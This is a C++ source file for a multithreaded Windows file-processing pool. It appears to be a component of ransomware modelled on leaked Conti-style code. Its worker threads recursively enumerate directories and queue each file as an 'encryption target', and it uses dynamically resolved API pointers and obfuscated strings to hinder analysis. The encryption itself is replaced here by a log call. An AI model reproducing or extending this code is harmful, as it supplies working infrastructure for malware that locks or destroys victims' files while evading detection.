#include "threadpool.h"
#include "../common.h"
#include "../api/getapi.h"
#include "../filesystem/filesystem.h"
#include "../logs/logs.h"
#include "../obfuscation/MetaString.h"

// ORIGINAL

STATIC threadpool::THREADPOOL_INFO g_ThreadPools[3];

STATIC
DWORD WINAPI ThreadHandler(PVOID pArg)
{
	INT ThreadPoolId = (INT)(ULONG_PTR)pArg;
	threadpool::PTHREADPOOL_INFO pPool = &g_ThreadPools[ThreadPoolId];

	while (TRUE) {

		pEnterCriticalSection(&pPool->ThreadPoolCS);

		if (TAILQ_EMPTY(&pPool->TaskList)) {

			pLeaveCriticalSection(&pPool->ThreadPoolCS);

			if (pPool->IsWaiting) {
				break;
			}

			pWaitForSingleObject(pPool->hQueueEvent, 1000);
			continue;

		}

		threadpool::PTASK_INFO pTask = TAILQ_FIRST(&pPool->TaskList);
		if (!pTask) {
			pLeaveCriticalSection(&pPool->ThreadPoolCS);
			continue;
		}

		TAILQ_REMOVE(&pPool->TaskList, pTask, Entries);
		pPool->TasksCount--;

		pLeaveCriticalSection(&pPool->ThreadPoolCS);

		std::wstring taskPath = pTask->FileName;
		delete pTask;

		if (taskPath == STOP_MARKER) {
			break;
		}

		// Check if this is a directory or file
		DWORD dwAttrib = pGetFileAttributesW(taskPath.c_str());

		if (dwAttrib != INVALID_FILE_ATTRIBUTES &&
			(dwAttrib & FILE_ATTRIBUTE_DIRECTORY)) {

			// Directory: enumerate files recursively
			filesystem::SearchFiles(taskPath, ThreadPoolId);

		}
		else {

			// File: process it (encryption target)
			logs::Write(OBFW(L"Processing: %s"), taskPath.c_str());

		}

	}

	return 0;
}

BOOL threadpool::Create(INT ThreadPoolId, SIZE_T ThreadsCount)
{
	PTHREADPOOL_INFO pPool = &g_ThreadPools[ThreadPoolId];

	RtlSecureZeroMemory(pPool, sizeof(THREADPOOL_INFO));

	pInitializeCriticalSection(&pPool->ThreadPoolCS);
	TAILQ_INIT(&pPool->TaskList);

	pPool->ThreadsCount = ThreadsCount;
	pPool->TasksCount = 0;
	pPool->IsWaiting = FALSE;

	pPool->hQueueEvent = pCreateEventW(NULL, FALSE, FALSE, NULL);
	if (!pPool->hQueueEvent) {
		return FALSE;
	}

	pPool->hThreads = (PHANDLE)m_malloc(ThreadsCount * sizeof(HANDLE));
	if (!pPool->hThreads) {
		return FALSE;
	}

	return TRUE;
}

BOOL threadpool::Start(INT ThreadPoolId)
{
	PTHREADPOOL_INFO pPool = &g_ThreadPools[ThreadPoolId];

	for (SIZE_T i = 0; i < pPool->ThreadsCount; i++) {

		pPool->hThreads[i] = pCreateThread(
			NULL,
			0,
			ThreadHandler,
			(PVOID)(ULONG_PTR)ThreadPoolId,
			0,
			NULL
		);

		if (!pPool->hThreads[i]) {
			return FALSE;
		}

	}

	return TRUE;
}

VOID threadpool::Wait(INT ThreadPoolId)
{
	PTHREADPOOL_INFO pPool = &g_ThreadPools[ThreadPoolId];

	pPool->IsWaiting = TRUE;

	// Signal all waiting threads
	for (SIZE_T i = 0; i < pPool->ThreadsCount; i++) {
		PutTask(ThreadPoolId, STOP_MARKER);
	}

	pSetEvent(pPool->hQueueEvent);

	// Wait for all threads to finish
	pWaitForMultipleObjects(
		(DWORD)pPool->ThreadsCount,
		pPool->hThreads,
		TRUE,
		INFINITE
	);

	// Cleanup
	for (SIZE_T i = 0; i < pPool->ThreadsCount; i++) {
		if (pPool->hThreads[i]) {
			pCloseHandle(pPool->hThreads[i]);
		}
	}

	pDeleteCriticalSection(&pPool->ThreadPoolCS);

	if (pPool->hQueueEvent) {
		pCloseHandle(pPool->hQueueEvent);
	}

	if (pPool->hThreads) {
		free(pPool->hThreads);
	}
}

INT threadpool::PutTask(INT ThreadPoolId, std::wstring Filename)
{
	PTHREADPOOL_INFO pPool = &g_ThreadPools[ThreadPoolId];

	if (pPool->TasksCount >= MAX_TASKS) {
		return 0;
	}

	PTASK_INFO pTask = new TASK_INFO;
	if (!pTask) {
		return 0;
	}

	pTask->FileName = Filename;

	pEnterCriticalSection(&pPool->ThreadPoolCS);

	TAILQ_INSERT_TAIL(&pPool->TaskList, pTask, Entries);
	pPool->TasksCount++;

	pLeaveCriticalSection(&pPool->ThreadPoolCS);

	pSetEvent(pPool->hQueueEvent);

	return 1;
}

BOOL threadpool::IsActive(INT ThreadPoolId)
{
	PTHREADPOOL_INFO pPool = &g_ThreadPools[ThreadPoolId];
	return (pPool->hThreads != NULL && pPool->ThreadsCount > 0);
}
